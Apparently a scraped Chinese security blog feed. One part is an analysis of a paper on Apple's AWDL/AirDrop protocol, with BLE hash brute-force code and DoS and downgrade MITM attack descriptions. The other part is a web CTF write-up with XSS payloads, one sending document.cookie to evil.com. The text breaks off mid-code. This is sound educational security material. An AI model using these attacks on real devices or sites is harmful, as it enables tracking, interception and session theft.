中允许在一个周期中配置不同数量的 EW，但是原论文作者在逆向时发现该值恒为 3。因此一个节点的最小监听周期为 4 个连续的 AW/EW，称为扩展可用窗口(Extended Availability Window, EAW)，即<code>1 EAW = AW + 3EW = 64 TU</code>。</p><p>为了进行同步，主节点需要在每个同步动作帧中宣布主节点下一个可用窗口的起始，主节点在动作帧里包含当前的 AW 或 EW 的序列号 $i (0&lt;=i&lt;2^(16))$，以及当前 AW(或 EW)到下一个 EAW 的单位时间 TU 的数量 $t_(AW)$，如下图所示，在第 40 个 AW 结束，第 41 个 EW 开始时主节点发送同步动作帧，这时当前 AW/EW 的序列号为 41，距离下一个 EAW 开始还需要<code>3*16=48 TU</code>。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/eaw.jpg"></p><p>同步的目的就是使集群中所有的从节点都采用和主节点一样的时间进度，主节点距离下一个 EAW 还需要多少时间，所有从节点也需要知道这个时间才能达到同步，因此当一个从节点在 $T_(Rx)$ 时间收到来自主节点的同步帧后，计算当前时间点到下一个主节点 AW 的时间间隔 $T_(AW)$ 的公式如下，在该公式中 $t_(air)$ 代表使用 WiFi 在空气中的传输时间，在实际计算时该值会被忽略，在近距离传播的环境下误差大概为 3 ms。</p><p>$$T_(AW)=t_(AW)*1024-(T_(TxPhy)-T_(TxTarget))+t_(air)+T_(Rx)$$</p><h3 id="信道序列"><a href="# 信道序列" class="headerlink" title="信道序列"></a>信道序列 </h3><p> 当所有节点的 AW 同步后，所有节点就处于同一个 AW 下，准备进行通信，这时就需要指示节点使用哪个信道进行通信并且将信道序列进行对齐以保证两个节点之间可以同时使用该信道通信。AWDL 常用的社交信道为 44，6，149 或 0，其中 0 代表节点没有监听任何信道。AWDL 将 AW 序列号与可用的信道序列进行映射，节点使用 Synchronization Parameters TLV 传输目前可用的信道序列，该 TLV 的格式如下图所示。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/spt.jpg"></p><p>传输的信道序列的个数 c+1 固定为 16，但是类似于 AW，信道序列可以使用 step 字段进行延长(AW 中的 step 为 3，为一个 EAW 扩展了 3 个 EW)，原论文逆向发现该 step 恒为 3，表示一个信道的使用时间将持续 4 个 AW 或者 1 个 EAW，如下图所示。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/channel.jpg"></p><p>当一个节点收到来自主节点的信道序列以及当前 AW 序列号后可以使用如下的公式计算 (映射) 出当前 AW 需要使用信道 C。<br>$$C=i mod ((c+1)*(step+1))$$</p><p>由于 AWDL 协议中 c 与 step 都是恒定值，所以<code>(c+1)*(step+1) = 64 AW</code>，而<code>64 AW * 16TU/AW = 1048576 μs ≈ 1 s</code>，即每个信道大约持续 1s 后跳变。</p><h2 id="相关资源"><a href="# 相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>原论文作者使用 C 实现了一份与 AWDL 协议等价的开源协议<a href="https://github.com/seemoo-lab/owl">OWL</a>，该协议可以运行在 Linux 和 macOS 上。</li><li>原论文作者提供了一个可以用于分析 AWDL 协议帧的<a href="https://github.com/seemoo-lab/wireshark-awdl">WireShark 分析器</a></li><li>原论文作者使用 Python 实现了与 AirDrop 等价的开源程序<a href="https://github.com/seemoo-lab/opendrop">OpenDrop</a></li></ul><h1 id="AirDrop 分析"><a href="#AirDrop 分析" class="headerlink" title="AirDrop 分析"></a>AirDrop 分析</h1><p>AirDrop 是一个在苹果生态系统里很方便远程传输数据的服务，基于 AWDL 协议使用 BLE 与 WiFi 发现设备与传输数据。设备的 AirDrop 有三种不同的状态：可被所有人发现，仅限联系人发现和禁止任何 AirDrop 连接请求，在默认情况下设备会开始 WiFi 与 BLE，并且设置为仅限联系人发现，此外设备需要被解锁后才可以被发现。</p><p>设备使用 AirDrop 传输数据一共需要经历三个阶段：服务发现，身份认证与数据传输，以传输照片为例，原论文作者提供的示意图如下图所示。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ad.jpg"></p><h2 id="服务发现"><a href="# 服务发现" class="headerlink" title="服务发现"></a>服务发现 </h2><p> 当照片发送方在照片分享界面中点击 AirDrop(隔空投送)后，设备广播携带有设备联系人标识符哈希的 BLE 广播。照片接收方设备将定期扫描 BLE 广播，接收方发现 BLE 广播后，若接收方设备设置为仅允许联系人连接，则将 BLE 广播中的联系人标识符哈希与接收方设备通讯里中的联系人哈希进行比较，若至少有一个匹配则激活 AWDL 接口。若接收方设备设置为允许任何人连接，则直接激活 AWDL 接口。接收方激活 AWDL 后与集群进行 AWDL 同步，同步完成后发送方使用 mDNS/DNS-SD 通过 AWDL 接口向接收方请求 AirDrop 服务(在集群中发现 AirDrop 服务)，并计算出接收方的 IPV6 地址。</p><h2 id="身份认证"><a href="# 身份认证" class="headerlink" title="身份认证"></a>身份认证 </h2><p> 发送方将对集群中每一个发现了 AirDrop 服务的设备建立一个 TLS 的链接，通过向接收方发送 HTTP Post 请求 (路径为 /Discover) 执行一个完整的身份认证握手，如果身份验证成功(返回 HTTP 200 OK)，则该设备的图标将会出现在发送方的 AirDrop 分享界面中。</p><p>对于 TLS 链接，苹果有两种不同的链接方式：已认证链接 (Authenticated Connection) 和未认证链接(Unauthenticated Connection)，AirDrop 默认尝试使用已认证链接进行认证建立 TLS 链接。已认证链接只能在拥有 Apple ID 并且互相存在于联系人通讯录的人之间建立。在 AirDrop 设置为仅联系人模式时只会使用已认证链接，而设置为允许任何人连接的模式下两种链接都会存在。经过已认证链接的身份认证后，AirDrop 界面中将会显示接收方的姓名以及联系人照片，如果没有照片则显示联系人姓名首字母的大写。而未认证链接的身份认证后则不会显示任何照片与姓名，联系人头像的位置将会显示默认的头像(带有头部轮廓的灰色头像)，姓名则会被设备名所替代，原论文中的举例如下：</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ui.jpg"></p><p>为了进行身份验证，设备需要证明其拥有与 Apple ID 相关联的联系人标识符 $c_i$(如电话，电子邮件)，该标识符必须存在于设备的联系人通讯录中。当用户使用 Apple ID 登录设备后，将会被分配一个唯一的 UUID。在进行身份验证时会使用哈希散列形式的苹果签名的“记录数据(Record Data, RD)”，RD 包含了设备 UUID 与所有设备中的通讯里联系人标识符 $c_i$，其格式如下所示。</p><p>$$RD = UUID, SHA2(c_1), …, SHA2(c_n)$$</p><p>发送方之后对 RD 签名为 $RD_s$，签名格式如下所示，其中 s 均代表苹果证书，sign 代表使用 $s_(VR)$ 对 RD 进行签名。</p><p>$$RD_s = RD, sign(s_(VR), RD), s_(VR), s_(AAI2)$$</p><p>在进行认证时接收方设备将会对其通讯录中的每个联系人标识符计算 SHA2，并将其与 $RD_s$ 中包含的哈希进行比较，验证设备 UUID 是否与当前 TLS 链接的证书相匹配。若发送方或接收方未能提供有效的经过苹果签名的 TLS 证书或者没有提供 RD，则 AirDrop 会将其视为未认证链接。</p><blockquote><p>在进行身份认证 (POST /Discover) 与传输请求 (POST /Ask) 时携带的数据均为 RD，在第一阶段广播 BLE 时携带的数据并不是 RD，虽然内容很像，但是只有通讯录联系人的部分哈希散列。</p></blockquote><h2 id="数据传输"><a href="# 数据传输" class="headerlink" title="数据传输"></a>数据传输 </h2><p> 当发送方在 AirDrop 界面中选择其中一个接收方后，双方将再次建立一个 TLS 链接，AirDrop 将会向接收方发送一个包含文件元数据与缩略图的 HTTP Post 请求(路径为 /Ask)。接收方收到请求后会弹出包含该文件缩略图的界面以提示用户是否决定接收该文件。若接收方决定接收(返回 HTTP 200 OK)，则将继续启动数据传输过程，发送方会将文件使用 HTTP Post 到接收方的设备里(路径为 /Upload)。</p><h1 id="强制激活 AWDL"><a href="# 强制激活 AWDL" class="headerlink" title="强制激活 AWDL"></a>强制激活 AWDL</h1><p>苹果为了节省能源消耗规定 AWDL 必须显示激活(例如 AirDrop 使用 BLE 广播)。在 AirDrop 允许任何人的模式下任何设备的 BLE 广播都将会激活目标设备的 AWDL 接口，但是当 AirDrop 处于仅联系人的模式下，只有在 BLE 广播中存在目标设备中联系人哈希的情况下才会激活目标设备的 AWDL 接口。</p><p>由于广播 BLE 时携带的联系人散列仅为 SHA2 的前 2 个字节，因此可以通过暴力枚举目标设备中联系人哈希的方法来强制激活处于仅联系人模式下的 AWDL 接口，其枚举空间仅为 <code>2^16=65535</code>，而一个 BLE 帧就可以携带 4 个联系人散列，因此在最坏的情况下攻击者只需要短时间发送 16384 个 BLE 帧就可以激活目标设备的 AWDL。蓝牙标准规定每一个 BLE 帧的最小发送间隔为 100 ms，则最多需要<code>16384*100/1000/60 ≈ 27</code> 分钟遍历整个枚举空间，虽然标准规定的最小发送间隔是写在蓝牙固件中的，但是可以修改固件来绕过这个最小发送间隔，原论文作者使用了 Nordic nRF51822，修改了最小发送间隔为 0.625 ms，理论上仅需 10.24 s 就可以遍历整个枚举空间，原论文作者修改的固件源码如下，BLE 同时监听 37，38，39 三个信道。另外原论文作者使用了另一个无线网卡以嗅探数据帧，当枚举成功后目标设备会向发送者发送 AWDL 同步动作帧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> *le_adv = airdrop_init_template()</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> h = <span class="number">0</span>; <span class="comment">/* loop */</span>; h += <span class="number">4</span>) &#123;</span><br><span class="line">    airdrop_set_hashes(le_adv, h, h+<span class="number">1</span>, h+<span class="number">2</span>, h+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint16_t</span> chan = <span class="number">37</span>; chan &lt; <span class="number">40</span>; chan++) &#123;</span><br><span class="line">        le_adv_tx(le_adv, chan);</span><br><span class="line">        sleep(<span class="number">0.625</span> <span class="comment">/* in milliseconds */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原论文作者最后通过实验 (假设 BLE 扫描窗口 / 持续时间为 30 ms，扫描间隔为 300 ms) 发现当通讯录中仅有 10 个人时，平均 10 秒就可以成功枚举出散列，当通讯录人数超过 100 人时仅需不到 1 秒，通讯录人数越多，暴破速度越快，此外原论文作者统计发现平均每一个用户都有超过 136 个联系人，因此该攻击方法在现实中是相当可行的。</p><h1 id="用户隐私泄露"><a href="# 用户隐私泄露" class="headerlink" title="用户隐私泄露"></a>用户隐私泄露 </h1><p> 为了保护用户隐私安全，避免用户被追踪，所有的苹果设备均实现了 MAC 地址随机化，但是 AWDL 动作帧中还是包含了部分用户敏感信息。</p><ol><li>设备 UUID，在 AirDrop 进行身份认证时会携带设备的 UUID，UUID 的作用就是可以唯一确定一台与 Apple ID 相关联的设备。</li><li>Hostname，当用户设置一台新的苹果设备时，苹果设备默认将会在设备主机名中加入用户名的一部分，例如“Jane-iPhone”，“王丽的 iPhone”等等，而用户也更倾向于此配置以方便朋友可以快速找到自己，当攻击者获取部分用户姓名以后可以通过差分隐私获取用户更多信息。</li><li>真实的 MAC 地址，设备所连接的 AP(主节点)，在部分 AWDL 动作帧中会加入这些字段。</li><li>设备操作系统，部分 AWDL 动作帧中携带了操作系统信息，甚至可以通过 AWDL 版本确定设备的操作系统版本，例如 macOS 10.12 使用 AWDL v2，macOS 10.13 使用 AWDL v3 等等。</li></ol><p>以上用户隐私信息均可以通过发送特定的 AWDL 动作帧或 BLE 广播帧触发，用户可以通过完全禁用(在需要使用的时候打开)AirDrop 来保护隐私，这使得 BLE 广播无法激活 AWDL 接口。</p><h1 id="拒绝服务攻击"><a href="# 拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击 </h1><p>AWDL 协议在设计上并没有考虑安全性，而是将帧传输的安全性交给应用层去处理(例如 AirDrop 使用 TLS 进行设备身份认证)，因此 AWDL 的帧是可以任意伪造的。在 AWDL 集群中，若两个节点想要进行通信就需要保持同步，同步操作主要由主节点完成，同步完成后两个节点就可以同时(在同一个 EAW 里) 使用同一个信道进行通信，但是由于 AWDL 协议里的包括同步帧的动作帧都是可以伪造的，因此可以伪造同步帧强行偏移信道序列，使两个目标无法同时在同一个信道上通信，即去同步化 (Desynchronize) 形成 DOS 攻击。该攻击主要需要以下三个条件：</p><ol><li>至少要成为两台设备的主节点，这样才可以发送动作帧。为了成为主节点就需要赢得选举，在 AWDL 集群中选举主要与节点的主指标与计数器这两个值相关，为了赢得选举则需要手动指定范围内最大的主度量与计数器。</li><li>可以分别与这两台设备进行单独通信，为了避免同时影响集群中的其他设备，只能使用单播向目标设备通信。</li><li>分别向两台设备发送不同的包括信道序列的同步参数 TLV，从而导致两台设备相互重合的信道最少。</li></ol><p>原论文作者提供了相应的 <a href="https://youtu.be/M5D9NeKapUo"> 演示视频</a>。上述攻击主要通过伪造 AWDL 动作帧实现去同步化使两个设备无法在同一信道中通信，可以规定 AWDL 集群中的节点不接受单播帧来防止此类攻击。</p><h1 id="中间人攻击"><a href="# 中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击 </h1><p> 该中间人攻击主要针对 AirDrop，其主要原理是通过强行将已认证连接降级为未认证连接，攻击者使用未认证连接冒充真正的接收方从而拦截数据。在前文中提到 AirDrop 由两种不同的身份认证链接：已认证链接和未认证链接，经过已认证链接 (接收方与发送方互相在对方的通讯录中) 的接收方在发送方的 AirDrop 界面会显示接收方在发送方通讯中的姓名与照片(若没有照片则显示姓名首字母大写)，经过未认证链接则只会显示接收方默认头像与设备名，这时接收方就可以巧妙的修改设备名使其类似于真实的姓名以欺骗发送方，于是发送方用以区分联系人是否经过认证的唯一方式只有通过观察接收方的头像。</p><p>进行中间人攻击主要有三个阶段：中断发送方的设备发现服务使真正的接收方无法被发现，降级已认证链接为未认证链接，实施中间人攻击拦截并修改传输数据。</p><h2 id="中断设备发现"><a href="# 中断设备发现" class="headerlink" title="中断设备发现"></a>中断设备发现 </h2><p> 首先需要防止数据的发送方发现真正的接收方，这样攻击者才可以冒充接收方拦截数据。中断设备发现可以通过前文中的去同步 DOS 攻击来实现，通过单播使目标 AWDL 节点同步失败，无法完成完整的 AirDrop 服务发现过程，真正的接收方就不会出现在发送方的 AirDrop 界面中，但是原论文作者在实验中发现在服务发现过程开始的时候发送方设备会增加信道的分配，使得两个设备之间信道的重合率上升，DOS 攻击的效果下降。可以使用一种替代方案：TCP 重置攻击，通过伪造 TCP 重置包使 RST 标志位设置为 1 来强制中断 TCP 链接。</p><h2 id="降级认证链接"><a href="# 降级认证链接" class="headerlink" title="降级认证链接"></a>降级认证链接 </h2><p> 当攻击者使用自签名的证书而不是苹果的证书时，发送方会采用未认证链接，由于未认证链接仅存在与 AirDrop 允许任何人连接的模式下，若发送方设备处于仅联系人的模式，则可以使用前文中的 DOS 攻击强迫发送方切换至允许任何人连接的模式。当未认证连接成功后，经过巧妙设计的攻击者设备名就会出现在发送方的 AirDrop 界面中，但是头像却是默认头像，这对于发送方来说可能并不会注意到这个变化。</p><h2 id="拦截并修改数据"><a href="# 拦截并修改数据" class="headerlink" title="拦截并修改数据"></a>拦截并修改数据 </h2><p> 当接收方通过攻击者 AirDrop 服务发现以后，就可以开始等待发送方启动 HTTPS 握手(发送方与攻击者握手，攻击者与接收方握手，就建立了两个 TLS 链接)，当攻击者收到来自发送方 /Ask 或 /Upload 请求后即可转发给接收方，或者修改请求中的数据实现中间人攻击。原论文作者提供的攻击示意图如下。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/mitm.jpg"></p><p>原论文作者提供了相应的 <a href="https://youtu.be/5T7Qatoh0Vo"> 演示视频</a>。对于缓解措施，原论文作者建议苹果修改 AirDrop 的 AI 使得未认证链接设备更加醒目，此外还建议添加当设备在允许任何连接模式下经过一段超时时间后就自动将 AirDrop 调整为仅联系人的模式的设置，这样就可以有效避免未认证的链接。</p>]]></content>
      
      
      <categories>
          
          <category> Paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireless </tag>
            
            <tag> Apple </tag>
            
            <tag> SDR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueWhale OJ Web WriteUp Part 1</title>
      <link href="/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/"/>
      <url>/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/</url>
      
        <content type="html"><![CDATA[<h1 id="Welcome-to-web-5"><a href="#Welcome-to-web-5" class="headerlink" title="Welcome to web(5)"></a>Welcome to web(5)</h1><p>Web 签到题，进入 php0 给一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>] == <span class="string">&#x27;areyousure&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;For this exercise, flag is: ******&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交 GET 参数 key，值为 areyousure，就可以得到 flag：<code>flag&#123;We1C0me_to_W3b&#125;</code></p><h1 id="Calculator-25"><a href="#Calculator-25" class="headerlink" title="Calculator(25)"></a>Calculator(25)</h1><p>给了一道简单的计算题，但是数字很大，要在 1.5 秒内算出来，手算根本不可能，这时候就需要借助脚本的帮助。<br>后端的逻辑是用户第一次访问的时候给一道计算题，这时候生成一个 session，服务器凭借这个 session 来判断用户时候已经领取过一个计算题，如果已经领取过就接受用户的答案。<br>可以用 Python 在第一次 GET 获取计算表达式以后保存 session，然后再用这个 session 把答案发过去，可以用正则表达式提取第一次 Get 获取的网页中的计算表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/calculator/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">ret = sess.get(url).content</span><br><span class="line">exp = re.findall(<span class="string">r&#x27;&lt;span id=&quot;exp&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, ret)[<span class="number">0</span>]</span><br><span class="line">ans = <span class="built_in">str</span>(<span class="built_in">eval</span>(exp.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> exp + ans</span><br><span class="line"><span class="built_in">print</span> sess.get(url + <span class="string">&#x27;?answer=&#x27;</span> + ans).content</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以用 JavaScript 直接再网页上操作计算答案然后再自动提交，不过手速要快一点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;answer&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>=<span class="built_in">eval</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;exp&#x27;</span>).<span class="property">innerText</span>.<span class="title function_">replace</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure><p>答案正确并且在 1.5 秒内提交即可获取 flag：<code>flag&#123;yes_you_are_calculat0r&#125;</code></p><h1 id="RapidTyping-50"><a href="#RapidTyping-50" class="headerlink" title="RapidTyping(50)"></a>RapidTyping(50)</h1><p>和 Calculater 差不多的套路，给一个很长的图片验证码，要求在 2.5 秒内输入，手工输入肯定是不可能的，查看网页源码可以发现验证码图片使用的是 svg+xml，那么就代表所有的验证码都是直接用 svg 绘制的，并且验证码的字符就在网页上，svg 的绘制内容采用 base64 编码，解码出以后再用正则表达式获取所有的验证码，需要注意的就是验证码是由顺序的，这个顺序要按照 x 的坐标顺序排列。</p><p>和 Calculater 一样，先 Get 获取验证码以后解出验证码在用同一个 session 发过去，可以用正则表达式提取 svg 的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/captcha/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">svg = base64.b64decode(</span><br><span class="line">    re.findall(<span class="string">r&#x27;&lt;img src=&quot;data:image/svg\+xml;base64,(.*?)&quot; /&gt;&#x27;</span>,</span><br><span class="line">               sess.get(url).content)[<span class="number">0</span>]</span><br><span class="line">)</span><br><span class="line">captchas = &#123;</span><br><span class="line">    <span class="built_in">int</span>(item[<span class="number">0</span>]): item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> re.findall(</span><br><span class="line">        <span class="string">r&#x27;&lt;text x=&quot;(\d+)&quot; y=&quot;\d+&quot; style=&quot;fill: rgb\(\d+, \d+, \d+\);&quot;&gt;(\w)&lt;/text&gt;&#x27;</span>, svg</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>.join([captchas[x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">sorted</span>(captchas.keys())])</span><br><span class="line"><span class="built_in">print</span> sess.get(url + <span class="string">&#x27;?code=&#x27;</span>+captcha).content</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以用 Javascript，不过手速要快一点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">svg = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">svg.<span class="property">innerHTML</span> = <span class="title function_">atob</span>(<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;img&#x27;</span>)[<span class="number">0</span>].<span class="property">src</span>.<span class="title function_">substr</span>(<span class="number">26</span>));</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">text = <span class="title class_">Array</span>.<span class="title function_">from</span>(svg.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;svg&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;text&#x27;</span>)).<span class="title function_">sort</span>(</span><br><span class="line">        <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">parseInt</span>(a.<span class="title function_">getAttribute</span>(<span class="string">&#x27;x&#x27;</span>))-<span class="built_in">parseInt</span>(b.<span class="title function_">getAttribute</span>(<span class="string">&#x27;x&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">forEach</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">        captcha += item.<span class="property">innerHTML</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;code&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span> = captcha;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure><p>答案正确并且在 2.5 秒内解出即可获得 flag：<code>flag&#123;svg_C4P7cHa_n0t_$ecUr3&#125;</code></p><h1 id="XSS1-75"><a href="#XSS1-75" class="headerlink" title="XSS1(75)"></a>XSS1(75)</h1><p>基本的 XSS，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;svg&gt;&lt;script&gt;var a=\&quot;&quot;</span>. <span class="variable">$text</span> . <span class="string">&quot;\&quot;&lt;/script&gt;&lt;/svg&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>过滤了双引号，尖括号和换行符，但是可以看到最后输出的位置是在 svg 的标签里，所以可以利用 svg 标签可以解析 HTMl 实体的特性完成注入。</p><p>测试 payload 如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;<span class="title function_">alert</span>(<span class="number">123</span>);<span class="keyword">var</span> b=&amp;amp;quot;</span><br></pre></td></tr></table></figure><p>先用 <code>&amp;amp;quot;</code> 闭合前面的双引号再加上 <code>;</code> 结束语句，后面就可以执行任意 javascript 代码了，最后再用一个 <code>&amp;amp;quot;</code> 闭合后面的双引号，或者也可以直接注释掉后面的双引号。</p><p>题目要求是拿到管理员的 cookie，payload 如下，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);img.<span class="property">src</span>=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>记得在输入的时候用 url 编码一下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26quot%3B%3Bimg%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2Fevil.com%2Fxss%2F%3Fcookie%3D%27%2Bescape%28document.cookie%29%3Bdocument.getElementsByTagName%28%27form%27%29%5B0%5D.appendChild%28img%29%3B%2F%2F</span><br></pre></td></tr></table></figure><p>最后从 cookie 里获取 flag：<code>flag&#123;Br0wseR_F3atUre&#125;</code></p><h1 id="XSS-2-75"><a href="#XSS-2-75" class="headerlink" title="XSS 2(75)"></a>XSS 2(75)</h1><p>这次没有直接给源码，输出的引号前面会被加上反斜杠转义，但是查看网页源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 